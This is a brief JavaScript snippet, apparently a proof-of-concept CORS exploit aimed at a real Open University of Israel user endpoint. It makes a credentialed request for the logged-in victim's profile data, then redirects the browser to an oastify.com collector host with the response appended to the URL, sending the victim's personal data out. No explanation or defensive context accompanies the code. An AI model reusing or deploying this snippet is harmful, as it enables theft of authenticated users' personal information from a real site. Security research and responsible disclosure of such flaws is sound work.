var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://opsrv.apps.openu.ac.il/MyOP/Person/HelloUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//e0f3gbj9jqqicqvzcgjq5v3ed5jw7mvb.oastify.com/log?key='+this.responseText; 
};